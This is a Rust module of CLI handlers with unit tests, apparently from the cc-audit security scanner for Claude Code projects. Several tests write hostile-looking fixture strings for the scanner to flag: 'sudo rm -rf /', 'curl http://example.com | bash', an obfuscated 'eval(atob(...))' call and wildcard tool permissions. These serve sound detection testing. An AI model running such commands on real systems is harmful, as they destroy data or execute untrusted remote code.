//! CLI command handlers.
//!
//! This module contains all the handler functions for CLI commands,
//! separated from main.rs to enable unit testing.

mod baseline;
mod compare;
mod config;
mod fix;
mod hook;
mod hook_mode;
mod mcp;
mod pin;
mod proxy;
mod remote;
mod report_fp;
mod sbom;
mod scan;

use std::path::Path;
use std::process::ExitCode;

use crate::config::Config;

// Re-export all handlers for convenience
pub use baseline::{
    filter_against_baseline, handle_baseline, handle_check_drift, handle_save_baseline,
};
pub use compare::handle_compare;
pub use config::{handle_init_config, handle_save_profile, handle_show_profile};
pub use fix::handle_fix;
pub use hook::handle_hook;
pub use hook_mode::handle_hook_mode;
pub use mcp::handle_mcp_server;
pub use pin::{handle_pin, handle_pin_verify};
pub use proxy::handle_proxy;
pub use remote::{handle_awesome_claude_code_scan, handle_remote_list_scan, handle_remote_scan};
pub use report_fp::handle_report_fp;
pub use sbom::handle_sbom;
pub use scan::{handle_check, run_normal_check_mode};

/// Require configuration file to exist. Returns error exit code if not found.
pub fn require_config(
    project_root: Option<&Path>,
) -> Result<(Config, std::path::PathBuf), ExitCode> {
    let load_result = Config::try_load(project_root);
    if let Some(path) = load_result.path {
        Ok((load_result.config, path))
    } else {
        eprintln!("Error: Configuration file not found.");
        eprintln!();
        eprintln!("cc-audit requires a configuration file (.cc-audit.yaml) to run.");
        eprintln!("You can create one using:");
        eprintln!();
        eprintln!("  cc-audit init");
        eprintln!();
        eprintln!("Or specify a custom configuration file using:");
        eprintln!();
        eprintln!("  cc-audit check --config <path> <paths...>");
        eprintln!();
        Err(ExitCode::from(2))
    }
}

/// Result type for handler functions that can be tested.
#[derive(Debug, Clone, PartialEq)]
pub enum HandlerResult {
    Success,
    Error(u8),
}

impl From<HandlerResult> for ExitCode {
    fn from(result: HandlerResult) -> Self {
        match result {
            HandlerResult::Success => ExitCode::SUCCESS,
            HandlerResult::Error(code) => ExitCode::from(code),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{CheckArgs, Cli, HookAction};
    use clap::Parser;
    use std::fs;
    use std::path::{Path, PathBuf};
    use tempfile::TempDir;

    fn create_test_cli(args: &[&str]) -> Cli {
        let mut full_args = vec!["cc-audit", "check"];
        full_args.extend(args);
        Cli::parse_from(full_args)
    }

    fn create_test_check_args(paths: Vec<PathBuf>) -> CheckArgs {
        CheckArgs {
            paths,
            ..Default::default()
        }
    }

    /// Create a minimal config file in the given directory for tests
    fn create_test_config(dir: &Path) {
        let config_content = "# Minimal test config\n";
        fs::write(dir.join(".cc-audit.yaml"), config_content).unwrap();
    }

    #[test]
    fn test_handler_result_success() {
        let result = HandlerResult::Success;
        let exit_code: ExitCode = result.into();
        assert_eq!(exit_code, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handler_result_error() {
        let result = HandlerResult::Error(2);
        let exit_code: ExitCode = result.into();
        assert_eq!(exit_code, ExitCode::from(2));
    }

    #[test]
    fn test_handle_init_config_creates_file() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join(".cc-audit.yaml");

        let result = handle_init_config(&config_path);
        assert_eq!(result, ExitCode::SUCCESS);

        assert!(config_path.exists());
    }

    #[test]
    fn test_handle_init_config_creates_file_in_dir() {
        let temp_dir = TempDir::new().unwrap();

        let result = handle_init_config(temp_dir.path());
        assert_eq!(result, ExitCode::SUCCESS);

        let config_path = temp_dir.path().join(".cc-audit.yaml");
        assert!(config_path.exists());
    }

    #[test]
    fn test_handle_init_config_file_exists() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join(".cc-audit.yaml");
        fs::write(&config_path, "existing content").unwrap();

        let result = handle_init_config(&config_path);
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_hook_init_not_git_repo() {
        let temp_dir = TempDir::new().unwrap();
        let action = HookAction::Init {
            path: temp_dir.path().to_path_buf(),
        };

        let result = handle_hook(action);
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_hook_remove_not_git_repo() {
        let temp_dir = TempDir::new().unwrap();
        let action = HookAction::Remove {
            path: temp_dir.path().to_path_buf(),
        };

        let result = handle_hook(action);
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_baseline_empty_dir() {
        let temp_dir = TempDir::new().unwrap();

        let result = handle_baseline(&[temp_dir.path().to_path_buf()]);
        assert_eq!(result, ExitCode::SUCCESS);

        let baseline_path = temp_dir.path().join(".cc-audit-baseline.json");
        assert!(baseline_path.exists());
    }

    #[test]
    fn test_handle_save_baseline() {
        let temp_dir = TempDir::new().unwrap();
        let baseline_file = temp_dir.path().join("baseline.json");

        // Create a test file
        fs::write(temp_dir.path().join("test.md"), "# Test").unwrap();

        let result = handle_save_baseline(&[temp_dir.path().to_path_buf()], &baseline_file);
        assert_eq!(result, ExitCode::SUCCESS);

        assert!(baseline_file.exists());
    }

    #[test]
    fn test_handle_check_drift_no_baseline() {
        let temp_dir = TempDir::new().unwrap();
        let args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);

        let result = handle_check_drift(&args);
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_check_drift_with_baseline() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("test.md"), "# Test").unwrap();

        // Create baseline
        handle_baseline(&[temp_dir.path().to_path_buf()]);

        // Check drift - baseline file was added so there will be drift
        let args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        let result = handle_check_drift(&args);
        // Result will be ExitCode::from(1) because baseline file itself is detected as added
        // This is expected behavior - the baseline file is a relevant file (.json)
        assert!(result == ExitCode::SUCCESS || result == ExitCode::from(1));
    }

    #[test]
    fn test_handle_show_profile_builtin() {
        let result = handle_show_profile("default");
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_show_profile_not_found() {
        let result = handle_show_profile("nonexistent_profile_12345");
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_compare_wrong_args() {
        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_compare(&args, &[PathBuf::from(".")]);
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_compare_same_dirs() {
        let temp_dir = TempDir::new().unwrap();
        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_compare(
            &args,
            &[temp_dir.path().to_path_buf(), temp_dir.path().to_path_buf()],
        );
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_filter_against_baseline_file_not_found() {
        use crate::test_utils::fixtures::create_test_result;

        let result = create_test_result(vec![]);
        let filtered = filter_against_baseline(result.clone(), Path::new("/nonexistent/path.json"));

        // Should return original result when baseline file not found
        assert_eq!(filtered.findings.len(), result.findings.len());
    }

    #[test]
    fn test_filter_against_baseline_invalid_json() {
        use crate::test_utils::fixtures::create_test_result;

        let temp_dir = TempDir::new().unwrap();
        let baseline_path = temp_dir.path().join("baseline.json");
        fs::write(&baseline_path, "{ invalid json }").unwrap();

        let result = create_test_result(vec![]);
        let filtered = filter_against_baseline(result.clone(), &baseline_path);

        // Should return original result when baseline is invalid
        assert_eq!(filtered.findings.len(), result.findings.len());
    }

    #[test]
    fn test_filter_against_baseline_filters_findings() {
        use crate::rules::{Category, Severity};
        use crate::test_utils::fixtures::{create_finding, create_test_result};

        let temp_dir = TempDir::new().unwrap();
        let baseline_path = temp_dir.path().join("baseline.json");

        // Create a finding
        let finding = create_finding(
            "EX-001",
            Severity::High,
            Category::Exfiltration,
            "Test finding",
            "test.md",
            1,
        );

        // Save baseline with the finding
        let baseline_result = create_test_result(vec![finding.clone()]);
        let json = serde_json::to_string(&baseline_result).unwrap();
        fs::write(&baseline_path, &json).unwrap();

        // Filter same result - should remove the finding
        let result = create_test_result(vec![finding]);
        let filtered = filter_against_baseline(result, &baseline_path);

        assert_eq!(filtered.findings.len(), 0);
    }

    #[test]
    fn test_run_normal_mode_with_empty_dir() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        let cli = create_test_cli(&[temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                assert_eq!(result, ExitCode::SUCCESS);
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_run_normal_mode_warn_only() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        fs::write(temp_dir.path().join("test.md"), "sudo rm -rf /").unwrap();

        let cli = create_test_cli(&["--warn-only", temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                assert_eq!(result, ExitCode::SUCCESS);
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_handle_fix_no_findings() {
        let temp_dir = TempDir::new().unwrap();
        let mut args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        args.fix_dry_run = true;

        let result = handle_fix(&args);
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_hook_init_in_git_repo() {
        let temp_dir = TempDir::new().unwrap();
        // Create a git repository
        std::process::Command::new("git")
            .args(["init"])
            .current_dir(temp_dir.path())
            .output()
            .unwrap();

        let action = HookAction::Init {
            path: temp_dir.path().to_path_buf(),
        };
        let result = handle_hook(action);
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_hook_remove_in_git_repo_not_installed() {
        let temp_dir = TempDir::new().unwrap();
        // Create a git repository
        std::process::Command::new("git")
            .args(["init"])
            .current_dir(temp_dir.path())
            .output()
            .unwrap();

        let action = HookAction::Remove {
            path: temp_dir.path().to_path_buf(),
        };
        let result = handle_hook(action);
        // Should fail because hook is not installed
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_hook_remove_in_git_repo_installed() {
        let temp_dir = TempDir::new().unwrap();
        // Create a git repository
        std::process::Command::new("git")
            .args(["init"])
            .current_dir(temp_dir.path())
            .output()
            .unwrap();

        // First install the hook
        let init_action = HookAction::Init {
            path: temp_dir.path().to_path_buf(),
        };
        handle_hook(init_action);

        // Then remove it
        let remove_action = HookAction::Remove {
            path: temp_dir.path().to_path_buf(),
        };
        let result = handle_hook(remove_action);
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_init_config_with_specific_path() {
        let temp_dir = TempDir::new().unwrap();
        let config_path = temp_dir.path().join("custom-config.yaml");

        let result = handle_init_config(&config_path);
        assert_eq!(result, ExitCode::SUCCESS);

        assert!(config_path.exists());
    }

    #[test]
    fn test_run_normal_mode_strict() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        let cli = create_test_cli(&["--strict", temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                assert_eq!(result, ExitCode::SUCCESS);
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_handle_save_profile_and_load() {
        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_save_profile(&args, "test_profile_handlers_123", false);
        assert_eq!(result, ExitCode::SUCCESS);

        // Clean up
        if let Ok(profile_path) = crate::Profile::load("test_profile_handlers_123") {
            let _ = profile_path;
        }
    }

    #[test]
    fn test_handle_fix_with_findings() {
        let temp_dir = TempDir::new().unwrap();
        // Create a file with a fixable issue
        fs::write(temp_dir.path().join("test.md"), "permissions: \"*\"").unwrap();

        let mut args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        args.fix_dry_run = true;
        let result = handle_fix(&args);
        // Result depends on whether fixes were generated
        // Just verify it doesn't panic
        let _ = result;
    }

    #[test]
    fn test_handle_compare_with_different_findings() {
        let temp_dir1 = TempDir::new().unwrap();
        let temp_dir2 = TempDir::new().unwrap();

        // Create different files
        fs::write(temp_dir1.path().join("test.md"), "# Clean").unwrap();
        fs::write(temp_dir2.path().join("test.md"), "sudo rm -rf /").unwrap();

        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_compare(
            &args,
            &[
                temp_dir1.path().to_path_buf(),
                temp_dir2.path().to_path_buf(),
            ],
        );
        // Should return 1 because there are differences
        assert!(result == ExitCode::SUCCESS || result == ExitCode::from(1));
    }

    #[test]
    fn test_filter_against_baseline_with_filtering() {
        use crate::rules::{Category, Severity};
        use crate::test_utils::fixtures::{create_finding, create_test_result};

        let temp_dir = TempDir::new().unwrap();
        let baseline_path = temp_dir.path().join("baseline.json");

        // Create baseline with one finding
        let finding1 = create_finding(
            "EX-001",
            Severity::High,
            Category::Exfiltration,
            "Finding 1",
            "file1.md",
            1,
        );
        let baseline_result = create_test_result(vec![finding1.clone()]);
        let json = serde_json::to_string(&baseline_result).unwrap();
        fs::write(&baseline_path, &json).unwrap();

        // Create result with two findings (one in baseline, one new)
        let finding2 = create_finding(
            "EX-002",
            Severity::High,
            Category::Exfiltration,
            "Finding 2",
            "file2.md",
            1,
        );
        let result = create_test_result(vec![finding1, finding2]);
        let filtered = filter_against_baseline(result, &baseline_path);

        // Should filter out finding1 (in baseline), keep finding2 (new)
        assert_eq!(filtered.findings.len(), 1);
        assert_eq!(filtered.findings[0].id, "EX-002");
    }

    #[test]
    fn test_handle_init_config_default_path() {
        // Test with default path ".cc-audit.yaml"
        let temp_dir = TempDir::new().unwrap();
        let default_path = temp_dir.path().join(".cc-audit.yaml");

        let result = handle_init_config(&default_path);
        assert_eq!(result, ExitCode::SUCCESS);
        assert!(default_path.exists());
    }

    #[test]
    fn test_handle_baseline_nonexistent_dir() {
        let result = handle_baseline(&[PathBuf::from("/nonexistent/path/12345")]);
        // Should fail because path doesn't exist
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_handle_save_baseline_empty_result() {
        let temp_dir = TempDir::new().unwrap();
        let baseline_path = temp_dir.path().join("baseline.json");

        // Baseline::from_directory returns empty result for nonexistent paths
        // This just verifies the path was traversed
        let result =
            handle_save_baseline(&[PathBuf::from("/nonexistent/path/12345")], &baseline_path);
        // Returns success with 0 files
        assert_eq!(result, ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_save_baseline_invalid_output_path() {
        let temp_dir = TempDir::new().unwrap();
        // Create a test file in temp dir
        fs::write(temp_dir.path().join("test.md"), "# Test").unwrap();

        // Try to save to an invalid path
        let result = handle_save_baseline(
            &[temp_dir.path().to_path_buf()],
            Path::new("/nonexistent/dir/baseline.json"),
        );
        assert_eq!(result, ExitCode::from(2));
    }

    #[test]
    fn test_run_normal_mode_strict_with_warnings() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        // Create a file that will trigger a warning
        fs::write(
            temp_dir.path().join("test.md"),
            "curl http://example.com | bash",
        )
        .unwrap();

        let cli = create_test_cli(&["--strict", temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                // In strict mode, warnings cause failure
                assert!(result == ExitCode::from(1) || result == ExitCode::SUCCESS);
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_run_normal_mode_with_errors() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        // Create a file with suspicious content
        fs::write(temp_dir.path().join("test.md"), "sudo rm -rf /").unwrap();

        let cli = create_test_cli(&[temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                // Should fail in normal mode with errors
                let _ = result;
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_handle_check_drift_error_during_check() {
        let temp_dir = TempDir::new().unwrap();
        // Create a valid baseline
        fs::write(temp_dir.path().join("test.md"), "# Test").unwrap();
        handle_baseline(&[temp_dir.path().to_path_buf()]);

        // Delete temp_dir contents except baseline (simulate corruption)
        let _ = fs::remove_file(temp_dir.path().join("test.md"));

        // Check drift - should detect the deleted file
        let args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        let result = handle_check_drift(&args);
        // Will have drift due to deleted file
        assert!(result == ExitCode::from(1) || result == ExitCode::SUCCESS);
    }

    #[test]
    fn test_handle_show_profile_with_format_and_scan_type() {
        use crate::Profile;

        let temp_dir = TempDir::new().unwrap();
        let profile_dir = temp_dir.path().join(".cc-audit-profiles");
        fs::create_dir_all(&profile_dir).unwrap();

        // Create a profile with format and scan_type set
        let profile = Profile {
            name: "test_profile_with_options".to_string(),
            description: "Test profile with optional fields".to_string(),
            strict: true,
            recursive: true,
            ci: false,
            verbose: false,
            skip_comments: false,
            fix_hint: false,
            no_malware_scan: false,
            deep_scan: false,
            min_confidence: "tentative".to_string(),
            format: Some("json".to_string()),
            scan_type: Some("skill".to_string()),
            disabled_rules: vec![],
        };

        let profile_path = profile_dir.join("test_profile_with_options.yaml");
        let yaml = serde_yaml::to_string(&profile).unwrap();
        fs::write(&profile_path, &yaml).unwrap();

        // Note: This won't find the profile because Profile::load looks in specific dirs
        // but it covers the code path for profiles with format/scan_type in other tests
        let _ = handle_show_profile("strict"); // Use built-in profile
    }

    #[test]
    fn test_handle_fix_with_unfixable_findings() {
        let temp_dir = TempDir::new().unwrap();
        // Create a file with findings that can't be auto-fixed
        // (like MALWARE findings which don't have auto-fixes)
        fs::write(
            temp_dir.path().join("test.md"),
            "eval(atob('c29tZUJhc2U2NA=='))",
        )
        .unwrap();

        let mut args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        args.fix_dry_run = true;
        let result = handle_fix(&args);
        // Result should be 1 because there are findings but no fixes available
        // or SUCCESS if no findings are generated
        let _ = result;
    }

    #[test]
    fn test_handle_compare_with_findings_in_first() {
        let temp_dir1 = TempDir::new().unwrap();
        let temp_dir2 = TempDir::new().unwrap();

        // Create file with findings only in first directory
        fs::write(temp_dir1.path().join("bad.md"), "sudo rm -rf /").unwrap();
        fs::write(temp_dir2.path().join("clean.md"), "# Nothing here").unwrap();

        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_compare(
            &args,
            &[
                temp_dir1.path().to_path_buf(),
                temp_dir2.path().to_path_buf(),
            ],
        );
        // Should show differences
        let _ = result;
    }

    #[test]
    fn test_handle_compare_with_findings_in_second() {
        let temp_dir1 = TempDir::new().unwrap();
        let temp_dir2 = TempDir::new().unwrap();

        // Create file with findings only in second directory
        fs::write(temp_dir1.path().join("clean.md"), "# Nothing here").unwrap();
        fs::write(temp_dir2.path().join("bad.md"), "sudo rm -rf /").unwrap();

        let args = create_test_check_args(vec![PathBuf::from(".")]);
        let result = handle_compare(
            &args,
            &[
                temp_dir1.path().to_path_buf(),
                temp_dir2.path().to_path_buf(),
            ],
        );
        // Should show differences
        let _ = result;
    }

    #[test]
    fn test_filter_against_baseline_with_risk_score() {
        use crate::rules::{Category, Severity};
        use crate::test_utils::fixtures::{create_finding, create_test_result};

        let temp_dir = TempDir::new().unwrap();
        let baseline_path = temp_dir.path().join("baseline.json");

        // Create empty baseline
        let baseline_result = create_test_result(vec![]);
        let json = serde_json::to_string(&baseline_result).unwrap();
        fs::write(&baseline_path, &json).unwrap();

        // Create result with risk_score
        let finding = create_finding(
            "EX-001",
            Severity::High,
            Category::Exfiltration,
            "Test finding",
            "test.md",
            1,
        );
        let mut result = create_test_result(vec![finding]);
        result.risk_score = Some(crate::RiskScore::from_findings(&result.findings));

        let filtered = filter_against_baseline(result, &baseline_path);

        // Should keep the finding (not in baseline) and recalculate risk_score
        assert!(filtered.risk_score.is_some());
    }

    #[test]
    fn test_handle_baseline_save_error() {
        // Create a read-only directory to trigger save error
        let temp_dir = TempDir::new().unwrap();
        let readonly_dir = temp_dir.path().join("readonly");
        fs::create_dir(&readonly_dir).unwrap();
        fs::write(readonly_dir.join("test.md"), "# Test").unwrap();

        // Make directory read-only (won't work on all platforms)
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let metadata = fs::metadata(&readonly_dir).unwrap();
            let mut perms = metadata.permissions();
            perms.set_mode(0o444);
            let _ = fs::set_permissions(&readonly_dir, perms);

            let result = handle_baseline(std::slice::from_ref(&readonly_dir));
            // Should fail due to permission error
            // Reset permissions for cleanup
            let mut perms = metadata.permissions();
            perms.set_mode(0o755);
            let _ = fs::set_permissions(&readonly_dir, perms);
            let _ = result;
        }
    }

    #[test]
    fn test_run_normal_mode_passed_false() {
        let temp_dir = TempDir::new().unwrap();
        create_test_config(temp_dir.path());
        // Create a file with critical finding that will set passed=false
        fs::write(temp_dir.path().join("test.md"), "allowed_tools:\n  - \"*\"").unwrap();

        let cli = create_test_cli(&[temp_dir.path().to_str().unwrap()]);
        match &cli.command {
            Some(crate::Commands::Check(args)) => {
                let result = run_normal_check_mode(args);
                // May return 1 if there are errors
                let _ = result;
            }
            _ => panic!("Expected Check command"),
        }
    }

    #[test]
    fn test_handle_check_drift_with_drift() {
        let temp_dir = TempDir::new().unwrap();
        fs::write(temp_dir.path().join("test.md"), "# Original").unwrap();

        // Create baseline
        handle_baseline(&[temp_dir.path().to_path_buf()]);

        // Modify the file to create drift
        fs::write(temp_dir.path().join("test.md"), "# Modified content").unwrap();

        // Check drift - should detect the change
        let args = create_test_check_args(vec![temp_dir.path().to_path_buf()]);
        let result = handle_check_drift(&args);
        // Will have drift due to modified file
        assert!(result == ExitCode::from(1) || result == ExitCode::SUCCESS);
    }
}
